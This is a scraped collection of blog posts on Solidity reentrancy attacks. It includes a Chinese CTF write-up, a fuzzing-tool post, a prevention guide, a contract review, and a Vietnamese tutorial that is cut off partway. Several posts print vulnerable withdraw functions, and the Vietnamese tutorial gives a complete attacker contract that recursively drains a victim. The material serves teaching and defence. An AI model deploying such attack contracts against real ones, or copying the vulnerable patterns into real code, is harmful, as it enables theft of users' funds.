function \u57f7\u884c\u300d\u3002\u53e6\u5916\uff0c\u7576\u5408\u7d04\u6536\u5230\u55ae\u7d14\u7684 ether \u4ea4\u6613\u6642\uff08\u4e0d\u5e36\u6709 data\uff09\uff0c\u4e5f\u6703\u88ab\u5c0e\u5f15\u81f3 fallback function\u3002\u6240\u4ee5\uff0c\u5982\u679c\u5e0c\u671b\u5408\u7d04\u80fd\u5920\u63a5\u6536\u4e00\u822c\u7684 ether \u50b3\u9001\uff0c\u5fc5\u9808\u5728 fallback function \u5f8c\u9762\u52a0\u4e0a payable\u3002\u63a5\u8457\uff0c\u6211\u5011\u4f86\u770b\u4e00\u4e0b\u63d0\u9818\u51fd\u6578 withdrawFunds(\u2026) \uff1a\u524d\u4e09\u884c\u7a0b\u5f0f\u78bc\u7167\u9806\u5e8f\u5206\u5225\u6aa2\u67e5\u4e86\u63d0\u6b3e\u4eba\u5728\u5408\u7d04\u4e2d\u7684\u8cc7\u91d1\u91cf \u2265 \u63d0\u9818\u91d1\u984d\u63d0\u9818\u91d1\u984d \u2264 \u55ae\u6b21\u63d0\u9818\u9650\u5236 0.1 ether\u8ddd\u96e2\u4e0a\u6b21\u63d0\u9818\u6642\u9593\u5df2\u9593\u9694\u8d85\u904e\u4e00\u9031\u4ee5\u4e0a\u505a\u5b8c\u6aa2\u67e5\u5f8c\uff0c\u5408\u7d04\u958b\u59cb\u9032\u884c\u8cc7\u91d1\u8f49\u79fb4. \u5c0d msg.sender \u8f49\u79fb\u63d0\u9818\u91d1\u984d5. \u66f4\u65b0 msg.sender \u7684\u64c1\u6709\u6578\u91cf\u7d00\u93046. \u66f4\u65b0 msg.sender \u7684\u6700\u5f8c\u63d0\u9818\u6642\u9593\u4e4d\u770b\u4e4b\u4e0b\u6c92\u4ec0\u9ebc\u554f\u984c\uff0c\u8a72\u505a\u7684\u6aa2\u67e5\u90fd\u505a\u4e86\uff0c\u8cc7\u91d1\u8f49\u79fb\u5b8c\u4e5f\u6709\u8a18\u5f97\u66f4\u65b0\u72c0\u614b\u3002\u7136\u800c\uff0c\u9b54\u9b3c\u537b\u96b1\u85cf\u5728\u7d30\u7bc0\u4e4b\u4e2d\u2026\u89e3\u984c\u95dc\u9375\u9806\u5e8fwithdrawFunds(\u2026) \u51fd\u6578\u4e2d\u5148\u9032\u884c\u4e86\u8cc7\u91d1\u8f49\u79fb\uff0c\u63a5\u8457\u624d\u66f4\u65b0\u72c0\u614b\u3002\u5982\u679c\u6211\u5011\u80fd\u5728\u66f4\u65b0\u72c0\u614b\u524d\u518d\u6b21\u547c\u53eb withdrawFunds(\u2026)\uff0c\u662f\u4e0d\u662f\u5c31\u80fd\u907f\u514d\u56e0\u72c0\u614b\u66f4\u65b0\u800c\u53d7\u5230\u7684\u63d0\u9818\u9650\u5236\uff0c\u4e26\u4e14\u518d\u6b21\u8f49\u79fb\u8cc7\u91d1\u5462\uff1f\u6c92\u932f\uff01\u6211\u5011\u7684\u65b9\u6cd5\u5c31\u662f\u5728\u72c0\u614b\u88ab\u66f4\u65b0\u524d\uff0c\u900f\u904e\u905e\u8ff4\u91cd\u8907\u547c\u53eb withdrawFunds(\u2026) \u76f4\u5230\u628a\u5408\u7d04\u8cc7\u91d1\u638f\u7a7a\uff0c\u624d\u8b93\u5b83\u66f4\u65b0\u72c0\u614b\u3002\u4f46 withdrawFunds(\u2026) \u5df2\u7d93\u6709\u65e2\u5b9a\u7684\u7a0b\u5f0f\u78bc\u4e86\uff0c\u8981\u600e\u9ebc\u5728\u4e2d\u9014\u6539\u8b8a\u5b83\u7684\u57f7\u884c\u8def\u7dda\uff1f\u95dc\u9375\u5728\u65bc withdrawFunds(\u2026) \u4e2d\u7b2c\u56db\u884c\u7684\u8cc7\u91d1\u8f49\u79fb\uff1a\u5982\u679c\u662f\u8f49\u79fb\u5230\u4e00\u822c\u7684\u975e\u5408\u7d04\u5730\u5740\uff0c\u8f49\u79fb\u5b8c\u6210\u5f8c\u5c07\u76f4\u63a5\u7e7c\u7e8c\u57f7\u884c\u7b2c\u4e94\u884c\u7a0b\u5f0f\u78bc\u3002\u7136\u800c\uff0c\u82e5\u8f49\u79fb\u7684\u76ee\u7684\u5730\u662f\u4e00\u500b\u5408\u7d04\u5730\u5740\uff0c\u524d\u6587\u6709\u63d0\u5230\uff0c\u5c07\u6703\u547c\u53eb\u9019\u500b\u5408\u7d04\u7684 fallback function\uff01\u56e0\u6b64\uff0c\u6211\u5011\u64b0\u5beb\u53e6\u5916\u4e00\u500b\u5408\u7d04 AttackFreeshop.sol \uff0c\u4e26\u5728\u5176 fallback function \u4e2d\u547c\u53eb Freeshop.sol \u5408\u7d04\u7684 withdrawFunds(\u2026)\u3002AttackFreeshop.sol\u5728\u9019\u4efd\u5408\u7d04\u7684 attack() \u4e2d\uff0c\u6703\u5148\u547c\u53eb freeshop.depositFunds() \u5b58\u5165 0.1 ether \u4ee5\u8b93\u6211\u5011\u5728\u63a5\u4e0b\u4f86\u7684\u6b65\u9a5f\u80fd\u901a\u904e\u5e33\u6236\u984d\u5ea6\u64c1\u6709\u7684\u9650\u5236\uff0c\u63a5\u8457\u7acb\u5373\u547c\u53eb freeshop.withdrawFunds(\u2026) \u5c55\u958b\u653b\u64ca\u3002\u653b\u64ca\u958b\u59cb\u5f8c\uff0c\u7576 Freeshop \u5408\u7d04\u5224\u65b7 AttackFreeshop \u5730\u5740\u90fd\u7b26\u5408\u689d\u4ef6\uff0c\u6703\u5411\u5176\u8f49\u5e33\u4e26\u57f7\u884c AttackFreeshop \u7684 fallback function \u3002\u7531\u65bc\u72c0\u614b\u5c1a\u672a\u88ab\u66f4\u65b0\uff0c Freeshop \u6b64\u6642\u4ecd\u4ee5\u70ba AttackFreeshop \u5c1a\u672a\u9818\u53d6\uff0c\u56e0\u6b64\u518d\u6b21\u547c\u53eb freeshop.withdrawFunds(\u2026) \u5c31\u80fd\u518d\u6b21\u53d6\u6b3e\uff0c\u4e26\u518d\u6b21\u89f8\u767c fallback function\u3002\u76f4\u5230 Freeshop \u5408\u7d04\u9918\u984d\u4f4e\u65bc AttackFreeshop \u7576\u521d\u7684\u5b58\u5165\u984d\uff080.1 ether\uff09\uff0c\u624d\u6703\u7d42\u6b62\u905e\u8ff4\u4e26\u5b8c\u6210\u4ea4\u6613\u3002\u6b63\u5e38\u60c5\u6cc1\u4e0b\uff0c \u6b64\u6642 Freeshop \u9918\u984d\u61c9\u8a72\u70ba 0 \uff0c\u606d\u559c\u4f60\u904e\u95dc\uff01\u82e5 Freeshop \u9918\u984d\u4e0d\u70ba\u96f6\uff0c\u53ef\u80fd\u662f\u56e0\u70ba\u4f60\u66fe\u7d93\u81ea\u5df1\u5411 Freeshop \u8f49\u904e\u5e33\uff0c\u5c0e\u81f4\u7e3d\u9918\u984d\u8b8a\u70ba\u4e0d\u662f 0.1 ether \u7684\u500d\u6578\uff08AttackFreeshop \u4e2d\u8a2d\u5b9a\u63d0\u9818\u91d1\u984d\u70ba 0.1\uff09\uff0c\u8acb\u8abf\u6574\u91d1\u984d\u4e26\u91cd\u65b0\u90e8\u7f72\u5f8c\u518d\u57f7\u884c\u653b\u64ca\u3002\u5982\u679c\u60a8\u6709\u5176\u4ed6\u6709\u8da3\u7684\u89e3\u6cd5\uff0c\u6b61\u8fce\u5728\u4e0b\u65b9\u4e00\u8d77\u7559\u8a00\u8a0e\u8ad6\uff01\u53c3\u8003\u9023\u7d50Mastering Ethereum \u2014 Chapter 9. Smart Contract SecurityNew batchOverflow Bug in Multiple ERC20 Smart Contracts", "responses": 0, "tags": ["Ethereum", "Smart Contract", "Smart Contract Security", "Cypherpunks Ctf", "Crosslink"]}, {"title": "Detecting Reentrancy Issues in Smart Contracts Using Fuzzing", "post_link": "https://medium.com/consensys-diligence/detecting-reentrancy-issues-in-smart-contracts-using-fuzzing-e81474ba3a2e?source=search_post---------9", "author_name": "Valentin W\u00fcstholz", "author_link": "https://medium.com/@wuestholz", "publish_date": "2019-05-06", "last_modified_date": "2019-05-07", "readtime": "3.67", "claps": 215, "voters": 10, "content": "Detecting Reentrancy Issues in Smart Contracts Using FuzzingValentin W\u00fcstholzFollowMay 6 \u00b7 4 min readPhoto by Asael Pe\u00f1a on UnsplashIn previous posts, we introduced Harvey, a fuzzer for Ethereum smart contracts, and presented two techniques to boost its effectiveness: input prediction and multi-transaction fuzzing.Harvey is being developed by ConsenSys Diligence in collaboration with Maria Christakis from MPI-SWS. It is one of the tools that powers the MythX platform. Sign up for our beta to give it a try!Starting with the DAO attack, reentrancy issues have been exploited several times over the last few years to hack smart contracts. In previous posts, we saw examples of how we can use Harvey to detect assertion violations in smart contracts.In this post, we will explain how Harvey is able to detect other issues and in particular reentrancy issues.Motivating ExampleLet\u2019s look at the following smart contract (written in the Solidity programming language) to illustrate two reentrancy issues.The contract implements functionality for depositing (function Deposit) and withdrawing (functions WithdrawBuggy and WithdrawVeryBuggy) crypto assets (ether in our case). Many types of smart contracts, such as wallets and tokens, also implement such functionality. The contract manages balances of users by storing them in a map balance.When withdrawing the assets in function WithdrawVeryBuggy, the contract calls the sender of the transaction (i.e., the \u201cowner\u201d of the assets) on Line 13 in order to transfer the assets. Such external calls are very common in many contracts, but may lead to subtle issues if a call re-enters the calling contract. In our example, assuming the callee (i.e., owner being called) is another contract, it could have been programmed by an attacker to call WithdrawVeryBuggy again. This is possible since the owner\u2019s balance is only updated after the call and, eventually, could allow the attacker to drain the contract\u2019s assets. A similar scenario was exploited in the attack on the DAO contract.Preventing state updates after external callsTo detect such issues, Harvey warns the user about contracts that update the persistent state after external calls. It does so by monitoring the execution of every test input that is generated by the fuzzer. Such a runtime monitor records detected issues on-the-fly and one can easily create new detection components using a custom tracer that is hooked into the tracing component of the underlying Ethereum virtual machine (EVM) implementation (go-ethereum in our case).Harvey emits a warning (including a runnable test input) if it is able to generate a successful transaction that updates the persistent state (storage or balances) after an external call. Note that, in general, it is very difficult to automatically generate a concrete exploit for vulnerable contracts since one would need to synthesize the code of the callee contract (for example, to call back into a specific function with specific arguments under specific circumstances).To prevent this issue, the developer could move the balance update before the external call.Preventing state reads after external callsFunction WithdrawBuggy demonstrates this, but contains another subtle flaw. After the external call, the code emits an event if the balance was decreased. At least that seems to be the intention.However, in our example, this event could also be triggered if the balance was increased since the callee could trigger a call-back by invoking Deposit. The reason for this is that there is a read of the persistent state after the external call. A developer might wrongly assume that the state was not changed during the external call.Even though this issue may seem less critical, it constitutes a flaw in the contract\u2019s business logic that should be fixed or at the very least reviewed. Imagine a front-end component reacting to such wrongly emitted events (for example, by suggesting donations to the user whose balance supposedly decreased).Harvey will warn developers about this potential issue if it is able to generate a transaction that performs a read operation on the persistent state of a contract (storage and balance) after an external call. Like for state writes, Harvey is able to detect this issue by directly monitoring the execution of the EVM.One way to prevent this issue is by reading the state right before the external call. This tends to work well in cases where developers implicitly assume that external calls do not modify the contract\u2019s state. However, in general, a fix should be in line with the developer\u2019s intention. For instance, in our example, the developer might decide that call-backs should be prevented in the first place or that events should only be emitted within the outermost call (and not within call-backs).Detecting other issuesHarvey also uses runtime monitoring to detect other types of issues in smart contracts (currently SWC-101, SWC-104, SWC-107, SWC-110, SWC-123, SWC-124, and SWC-127), and can be easily extended by writing custom detection monitors. A later post might describe how to easily write such a runtime monitor in Go.In this post, we have illustrated how reentrancy issues can make smart contracts vulnerable to attacks and how Harvey is able to detect them using fuzzing and runtime monitoring of concrete executions of a contract.In the next post of this series, we will look at how to use Harvey to analyze systems with several contracts. Stay tuned!In the meanwhile, sign up for our beta if you want to try Harvey out yourself!Thanks to Maria Christakis, Joran Honig, John Mardlin (aka Maurelian), Mike Pumphrey, and Gerhard Wagner for feedback on drafts of this article.", "responses": 0, "tags": ["Fuzzing", "Program Analysis", "Security", "Testing", "Ethereum"]}, {"title": "Protect Your Solidity Smart Contracts From Reentrancy Attacks", "post_link": "https://medium.com/coinmonks/protect-your-solidity-smart-contracts-from-reentrancy-attacks-9972c3af7c21?source=search_post", "author_name": "Will Shahda", "author_link": "https://medium.com/@ethdapp", "publish_date": "2019-04-24", "last_modified_date": "2019-04-26", "readtime": "5.46", "claps": 70, "voters": 6, "content": "Protect Your Solidity Smart Contracts From Reentrancy AttacksWill ShahdaFollowApr 24 \u00b7 6 min readOne of the most devastating attacks you need to watch out for when developing smart contracts with Solidity are reentrancy attacks. They are devastating for two reasons: they can completely drain your smart contract of its ether, and they can sneak their way into your code if you\u2019re not careful.A reentrancy attack can occur when you create a function that makes an external call to another untrusted contract before it resolves any effects. If the attacker can control the untrusted contract, they can make a recursive call back to the original function, repeating interactions that would have otherwise not run after the effects were resolved.This simplest example is when a contract does internal accounting with a balance variable and exposes a withdraw function. If the vulnerable contract transfers funds before it sets the balance to zero, the attacker can recursively call the withdraw function repeatedly and drain the whole contract.Let\u2019s look at an example:function withdraw() external {    uint256 amount = balances[msg.sender];    require(msg.sender.call.value(amount)());    balances[msg.sender] = 0;}All an attacker needs to exploit this function is to get some amount of balance mapped to their smart contract address and create a fallback function that calls withdraw.After msg.sender.call.value(amount)() transfers the correct amount of funds, the attacker\u2019s fallback function calls withdraw again, transferring more funds before balances[msg.sender] = 0 can stop further transfers. This continues until there is either no ether remaining, or execution reaches the maximum stack size.Typically a vulnerable function will make an external call using transfer, send, or call. We will cover the differences between these functions in the section on preventing reentrancy attacks.Types of reentrancy attacksThere are two main types of reentrancy attacks: single function and cross-function reentrancy.Single function reentrancy attackThis type of attack is the simplest and easiest to prevent. It occurs when the vulnerable function is the same function the attacker is trying to recursively call.Our previous code example is a single function reentrancy attack.Cross-function reentrancy attackThese attacks are harder to detect. A cross-function reentrancy attack is possible when a vulnerable function shares state with another function that has a desirable effect for the attacker.This is easiest to explain with an example:function transfer(address to, uint amount) external {    if (balances[msg.sender] >= amount) {        balances[to] += amount;        balances[msg.sender] -= amount;    }}function withdraw() external {    uint256 amount = balances[msg.sender];    require(msg.sender.call.value(amount)());    balances[msg.sender] = 0;}In this example, withdraw calls the attacker\u2019s fallback function same as with the single function reentrancy attack.The difference is the fallback function makes a call to transfer instead of recursively calling withdraw. Because the balance has not been set to 0 before this call, the transfer function can transfer a balance that has already been spent.How bad can a reentrancy attack be?Just ask someone who invested in The DAO back in 2016. The DAO hack was one of the highest profile reentrancy attacks in Ethereum\u2019s history. An attacker managed to drain it of about 3.6 million ether.The DAO had a vulnerable function meant to split off a child DAO. The attacker used this function to recursively transfer funds from the original DAO to the child DAO that they controlled.The hack was so damaging the Ethereum Foundation resorted to a controversial hard fork that recovered investor funds. Most supported the hard fork, but part of the community thought it violated the core principles of cryptocurrency \u2014 namely immutability \u2014 and continued to use the old chain resulting in the creation of Ethereum Classic.Read more about the DAO hack here: http://hackingdistributed.com/2016/06/18/analysis-of-the-dao-exploit/Prevent reentrancy attacksThere are a few best practices you should follow to protect your smart contracts from reentrancy attacks.send, transfer, and callBecause most reentrancy attacks involve send, transfer, or call functions \u2014 it is important to understand the difference between them.send and transfer functions are considered safer because they are limited to 2,300 gas. The gas limit prevents the expensive external function calls back to the target contract. The one pitfall is when a contract sets a custom amount of gas for a send or transfer using msg.sender.call(ethAmount).gas(gasAmount).The call function is unfortunately much more vulnerable.When an external function call is expected to perform complex operations, you typically want to use the call function because it forwards all remaining gas. This opens the door for an attacker to make calls back to the original function in a single function reentrancy attack, or a different function from the original contract in a cross-function reentrancy attack.Wherever possible, use send or transfer in place of call to limit your security risk.Mark untrusted functionsTo protect against reentrancy attacks, it is important to identify when a function is untrusted. The Consensys best practices recommends that you name functions and variables to indicate if they are untrusted.For example:function untrustedWithdraw() public {    uint256 amount = balances[msg.sender];    require(msg.sender.call.value(amount)());    balances[msg.sender] = 0;}It is important to remember that if a function calls another untrusted function it is also untrusted.function untrustedSettleBalance() external {    untrustedWithdraw();}Checks-effects-interactions patternThe most reliable method of protecting against reentrancy attacks is using the checks-effects-interactions pattern.This pattern defines the order in which you should structure your functions.First perform any checks, which are normally assert and require statements, at the beginning of the function.If the checks pass, the function should then resolve all the effects to the state of the contract.Only after all state changes are resolved should the function interact with other contracts. By calling external functions last, even if an attacker makes a recursive call to the original function they cannot abuse the state of the contract.Let\u2019s rewrite our vulnerable withdraw function using the checks-effects-interactions pattern.function withdraw() external {    uint256 amount = balances[msg.sender];    balances[msg.sender] = 0;    require(msg.sender.call.value(amount)());}Because we zero out the balance \u2014 an effect \u2014 before making an external call, a recursive call made by an attacker will not be tricked into thinking there is still a remaining balance.MutexIn more complex situations such as protecting against cross-function reentrancy attacks it may be necessary to use a mutex.A mutex places a lock on the contract state. Only the owner of the lock can modify the state.Let\u2019s look at a simple implementation of a mutex.function transfer(address to, uint amount) external {    require(!lock);    lock = true;    if (balances[msg.sender] >= amount) {        balances[to] += amount;        balances[msg.sender] -= amount;    }    lock = false;}function withdraw() external {    require(!lock);    lock = true;    uint256 amount = balances[msg.sender];    require(msg.sender.call.value(amount)());    balances[msg.sender] = 0;    lock = false;}By using this lock, an attacker can no longer exploit the withdraw function with a recursive call. Nor can an attacker exploit a call to transfer for a cross-function reentrancy attack. All state modifications occur while lock is true, preventing any function checking the lock from being called out of order.You must be careful implementing a mutex to make sure there is always a way for a lock to be released. If an attacker can get a lock on your contract and prevent its release your contract can be rendered inert.OpenZeppelin has it\u2019s own mutex implementation you can use called ReentrancyGuard. This library provides a modifier you can apply to any function called nonReentrant that guards the function with a mutex.View the source code for the OpenZeppelin ReentrancyGuard library here: https://github.com/OpenZeppelin/openzeppelin-solidity/blob/master/contracts/utils/ReentrancyGuard.solKeep in mind that a nonReentrant function should be external. If another function calls the nonReentrant function it is no longer protected.The future of reentrancy attacksThere is always the risk of future updates introducing more opportunities for attacks. The Constantinople update was delayed because a flaw was discovered in EIP 1283 that introduced a new reentrancy attack using certain SSTORE operations. Had this update been deployed to the mainnet, even send and transfer functions would have been vulnerable.Attacks will get increasingly advanced and involve more complex interactions between functions and contracts to effect state. The best thing we can do to stay ahead is to keep interactions as simple as possible and employ best practices such as using transfer or send instead of call and using the checks-effects-interactions pattern to structure our functions.", "responses": 0, "tags": ["Ethereum", "Solidity", "Smart Contracts", "Smart Contract Security"]}, {"title": "A Jedi\u2019s guide to Solidity reentrancy attacks", "post_link": "https://medium.com/coinmonks/a-jedis-guide-to-solidity-reentrancy-attacks-f5ebfa6405c9?source=search_post", "author_name": "CipherZ", "author_link": "https://medium.com/@cipherz", "publish_date": "2018-03-27", "last_modified_date": "2018-06-18", "readtime": "2.61", "claps": 71, "voters": 4, "content": "install python packages from github1103lindsayA Jedi\u2019s guide to Solidity reentrancy attacksCipherZFollowMar 27, 2018 \u00b7 3 min readWriting a solidity contract is one thing, but making sure that the participant\u2019s funds are safe is another. Solidity attempts to enforce as much as possible through its compilation process, but it is up to the creator to take it across the finish line.In our previous article, we created a UI for our betting dApp that Master Obi-Wan and Yoda use to get their gambling fix. In this article we will work on examining the smart contract for any hidden security bugs or attack vectors.SecurityEveryone agrees that security is an issue that is absolutely critical to the success of mass blockchain adoption. We will use the following method to examine our smart contract for security bugs:Remix \u2014 We have already used this tool extensively in a previous article, but have not taken advantage of its analysis tab.RemixOpening up our Bet.sol smart contract in remix, we can see several issues in the analysis tab. The one that interests us at this point is the potential re-entrancy vulnerability.A re-entrancy condition is when an actor can call your contract\u2019s function and potentially re-enter the contract before the previous call is completed one or multiple times. This would be especially disastrous in the case of a payable function as is our case here.Bet.sol \u2014 vulnerable codeOur code checks for the executing address to be either a bet taker or originator on line 4 \u2014 which is good. We have eliminated most of the bad actors here. However, what if one of the players is a bad actor who has seen a vulnerability in the contract and is only participating as a means of exploiting that vulnerability. Our transfer function calls on lines 7, 8, 11, 13, 15, and 16 are vulnerable to such an attack. If you notice that I wrote the transfer amount based on the logic that the pot or total winnings would be roughly equal to the player\u2019s bet amounts multiplied by two. I do not keep up with the amount that has been paid out to each player. So, in the case that a player gets a payout, they could call the contract again recursively and there would be no check in place to see whether they had already been paid or not. They could essentially do this until they ran out of gas or the contract was drained of its eth. This would be something that you would do with another smart contract interacting with this Bet.sol where you would have a default fallback payable function that would call the payout function again before the original call returned.Bet.sol \u2014 FixedWhat we want to do is something called, optimistic accounting, where we deduct the payout amount from the player\u2019s funds represented by a stored number before we send the transfer function. This will prevent the reentrant behavior and still allow the deduction to be reverted in the case of an exception. We want to do this in general with solidity contract state as well to prevent reentrant attacks. Note that I put the resetGame() and getBetOutcome() methods before the calls to transfer winnings. This is safe because any errors with the transfer function(s) will revert our contract state anyways.Additional Resources:Testing for Reentrancy attacks in remixEthereum Stack Exchange is a question and answer site for users of Ethereum, the decentralized application platform and\u2026ethereum.stackexchange.com\u201cReentrancy Attack\u201d on a Smart ContractBugs in Solidity are costly, putting yourself and many others at risk, so its important to take precautions when\u2026medium.comReentrancy Attack On Smart Contracts: How To Identify The Exploitable And An Example Of An Attack\u2026To code smart contracts is certainly not a free picnic. A bug introduced in the code cost money and most likely not\u2026medium.com", "responses": 0, "tags": ["Solidity", "Remix", "Security", "Smart Contracts", "Ethereum"]}, {"title": "Reentrancy Attack", "post_link": "https://tradahacking.vn/reentrancy-attack-b78529ea455c?source=search_post", "author_name": "lofiboy", "author_link": "https://tradahacking.vn/@hocsama", "publish_date": "2018-07-22", "last_modified_date": "2018-07-24", "readtime": "3.38", "claps": 10, "voters": 3, "content": "Reentrancy AttacklofiboyFollowJul 22, 2018 \u00b7 4 min readM\u00ecnh c\u00f3 nghi\u00ean c\u1ee9u 1 ch\u00fat v\u1ec1 smart contract n\u00ean h\u00f4m nay vi\u1ebft 1 b\u00e0i chia s\u1ebb v\u1ec1 Reentrancy Attack . B\u00e0i n\u00e0y y\u00eau c\u1ea7u m\u1ecdi ng\u01b0\u1eddi c\u00f3 ch\u00fat ki\u1ebfn th\u1ee9c v\u1ec1 Blockchain, Smart Contract v\u1edbi Solidity .The Vulnerable Contractpragma solidity ^0.4.8;contract Victim {mapping(address => uint) public _balanceOf;function withdraw(){      require (_balanceOf[msg.sender] > 0);      uint x = _balanceOf[msg.sender];      msg.sender.call.value(x)();      _balanceOf[msg.sender] = 0;  }   function deposit() payable {      _balanceOf[msg.sender] = msg.value;  }}Vulnerable Contract s\u1ebd c\u00f3 2 ch\u1ee9c n\u0103ng l\u00e0 withdraw() v\u00e0 deposit() .mapping(address => uint) public _balanceOf;_balance0f l\u00e0 m\u1ea3ng l\u01b0u tr\u1eef s\u1ed1 ti\u1ec1n m\u00e0 ng\u01b0\u1eddi d\u00f9ng \u0111\u00e3 g\u1eedi.function deposit() payable {      _balanceOf[msg.sender] = msg.value;  }deposit() l\u00e0 ch\u1ee9c n\u0103ng g\u1eedi ti\u1ec1n. V\u00ed d\u1ee5 \u0111\u1ecba ch\u1ec9 c\u1ee7a b\u1ea1n l\u00e0 0x6E16D5938b67aB67F43Aa77356e3cdD5adF9Dc20 v\u00e0 b\u1ea1n g\u1eedi 5 ETH th\u00ec gi\u00e1 tr\u1ecb c\u1ee7a msg.value s\u1ebd b\u1eb1ng 5.10\u00b9\u2078 wei v\u00e0 s\u1ebd \u0111\u01b0\u1ee3c l\u01b0u trong _balanceOf[0x6E16D5938b67aB67F43Aa77356e3cdD5adF9Dc20] .function withdraw(){      require (_balanceOf[msg.sender] > 0);      uint x = _balanceOf[msg.sender];      msg.sender.call.value(x)();      _balanceOf[msg.sender] = 0;  }withdraw() l\u00e0 ch\u1ee9c n\u0103ng r\u00fat l\u1ea1i s\u1ed1 ti\u1ec1n m\u00e0 h\u1ecd \u0111\u00e3 g\u1eedi.require (_balanceOf[msg.sender] > 0);D\u00f2ng \u0111\u1ea7u ti\u00ean s\u1ebd ki\u1ec3m tra s\u1ed1 d\u01b0 ( msg.sender l\u00e0 \u0111\u1ecba ch\u1ec9 c\u1ee7a ng\u01b0\u1eddi d\u00f9ng ).uint x = _balanceOf[msg.sender];msg.sender.call.value(x)();\u0110\u00e2y l\u00e0 n\u01a1i s\u1ebd t\u1eadn d\u1ee5ng \u0111\u1ec3 exploit. M\u1ee5c \u0111\u00edch c\u1ee7a 2 d\u00f2ng n\u00e0y l\u00e0 g\u1eedi l\u1ea1i s\u1ed1 ti\u1ec1n \u0111\u01b0\u1ee3c l\u01b0u trong _balanceOf[msg.sender] ._balanceOf[msg.sender] = 0;Sau khi g\u1eedi xong th\u00ec g\u00e1n l\u1ea1i b\u1eb1ng 0\ufe0f\u20e3.Call Function And Fallback FunctionTr\u01b0\u1edbc khi exploit ch\u00fang ta s\u1ebd t\u00ecm hi\u1ec3u call function v\u00e0 fallback function.Trong smart contract m\u1ed7i contract l\u00e0 1 \u0111\u1ed1i t\u01b0\u1ee3ng gi\u1ed1ng trong l\u1eadp tr\u00ecnh h\u01b0\u1edbng \u0111\u1ed1i t\u01b0\u1ee3ng. V\u00ed d\u1ee5 m\u00ecnh mu\u1ed1n s\u1eed d\u1ee5ng ph\u01b0\u01a1ng th\u1ee9c fun(uint256 x) trong contract \ud83c\udd70\ufe0f th\u00ec m\u00ecnh g\u1ecdi n\u00f3 b\u1eb1ng c\u00e1ch \ud83c\udd70\ufe0f.fun(1) . C\u00f3 1 c\u00e1ch kh\u00e1c \u0111\u1ec3 g\u1ecdi ph\u01b0\u01a1ng th\u1ee9c fun(uint256 x) l\u00e0 d\u00f9ng call .A.call.(bytes4(sha3(\"fun(uint256)\")), 1)\u0110\u1ec3 x\u00e1c \u0111\u1ecbnh ph\u01b0\u01a1ng th\u1ee9c \u0111\u01b0\u1ee3c s\u1eed d\u1ee5ng th\u00ec d\u1ef1a tr\u00ean 4 byte \u0111\u1ea7u ti\u00ean c\u1ee7a sha3(\"fun(uint256)\") .Fallback function c\u00f3 d\u1ea1ng l\u00e0 function () { ... } \u0111\u01b0\u1ee3c g\u1ecdi khi m\u00e0 ph\u01b0\u01a1ng th\u1ee9cfun(uint256 x) kh\u00f4ng t\u1ed3n t\u1ea1i trong contract \ud83c\udd70\ufe0f( C\u00e1i n\u00e0y gi\u1ed1ng default trong switch case \ud83d\ude04 ). Fallback function c\u0169ng \u0111\u01b0\u1ee3c g\u1ecdi khi nh\u1eadn ether ( c\u00f3 d\u1ea1ng l\u00e0 function() payable { ... } ).How To Exploit \u2754Quay tr\u1edf l\u1ea1i v\u1edbi \u0111o\u1ea1n code c\u00f3 \ud83d\udc1euint x = _balanceOf[msg.sender];msg.sender.call.value(x)();_balanceOf[msg.sender] = 0;N\u1ebfu nh\u01b0 msg.sender l\u00e0 \u0111\u1ecba ch\u1ec9 c\u1ee7a ng\u01b0\u1eddi d\u00f9ng \ud83c\udd70\ufe0f th\u00ec sau khi th\u1ef1c hi\u1ec7n \u0111o\u1ea1n code tr\u00ean th\u00ec \ud83c\udd70\ufe0f s\u1ebd nh\u1eadn \u0111\u01b0\u1ee3c \u274c ether v\u00e0 _balanceOf[\ud83c\udd70\ufe0f] = 0\ufe0f\u20e3Ng\u01b0\u1ee3c l\u1ea1i msg.sender l\u00e0 \u0111\u1ecba ch\u1ec9 c\u1ee7a contract \ud83c\udd71\ufe0f th\u00ec \ud83c\udd71\ufe0f s\u1ebd nh\u1eadn \u0111\u01b0\u1ee3c \u274c ether v\u00e0 \u0111\u1ed3ng th\u1eddi th\u1ef1c thi fallback function trong \ud83c\udd71\ufe0f. Fallback function trong \ud83c\udd71\ufe0f c\u00f3 th\u1ec3 g\u1ecdi ti\u1ebfp h\u00e0m withdraw() c\u1ee7a contract \ud83c\udfe6 \u0111\u1ec3 r\u00fat ti\u1ec1n b\u1edfi v\u00ec _balanceOf[\ud83c\udd71\ufe0f] v\u1eabn l\u00e0 \u274c. V\u1eady l\u00e0 m\u00ecnh c\u00f3 th\u1ec3 r\u00fat h\u1ebft \ud83d\udcb0 c\u1ee7a \ud83c\udfe6D\u01b0\u1edbi \u0111\u00e2y l\u00e0 h\u00ecnh minh h\u1ecda qu\u00e1 tr\u00ecnh exploit .                \ud83c\udd71\ufe0f(0 ETH)            \ud83c\udfe6(2 ETH)0 ETH                           withdraw function       1 ETH                               /                         1 ETH /                             /          1 ETH       fallback function                           1 ETH                             \\                              \\                               \\                                withdraw function       0 ETH                               /                        1 ETH /                             /2 ETH       fallback function                             \\                              \\                               \\                                withdraw function       0 ETH                               X                              X                             X2 ETH       fallback functionKhi \ud83c\udfe6 h\u1ebft \ud83d\udcb0 th\u00ec msg.sender.call.value(x)() b\u1ecb fail v\u00e0 ngay l\u00fac \u0111\u00f3 v\u00f2ng l\u1eb7p ng\u1eebng l\u1ea1i. Easy money \ud83d\ude0fThe Attack ContractPh\u1ea7n n\u00e0y m\u00ecnh s\u1ebd vi\u1ebft \ud83c\udd71\ufe0f \u0111\u1ec3 exploit \ud83c\udfe6pragma solidity ^0.4.8;import './Victim.sol';contract B{  Victim public v;  uint public count;  function B(address victim) {    v = Victim(victim);  }  function attack() {    v.withdraw();  }  function deposit() public payable{    v.deposit.value(msg.value)();  }  function () payable {    count++;    if (count < 3) {      v.withdraw();    }   }}M\u00ecnh s\u1ebd gi\u1ea3i th\u00edch c\u00e1c th\u00e0nh ph\u1ea7n trong \ud83c\udd71\ufe0fVictim public v;uint public count;v l\u00e0 \u0111\u1ecba ch\u1ec9 c\u1ee7a contract \ud83c\udfe6count l\u00e0 s\u1ed1 l\u1ea7n m\u00e0 m\u00ecnh mu\u1ed1n r\u00fat ti\u1ec1n.function B(address victim) {    v = Victim(victim);  }\u0110\u00e2y l\u00e0 ph\u01b0\u01a1ng th\u1ee9c kh\u1edfi t\u1ea1o c\u1ee7a \ud83c\udd71\ufe0f v\u1edbi tham s\u1ed1 l\u00e0 \u0111\u1ecba ch\u1ec9 c\u1ee7a \ud83c\udfe6function deposit() public payable{    v.deposit.value(msg.value)();  }desposit() l\u00e0 ph\u01b0\u01a1ng th\u1ee9c trung gian 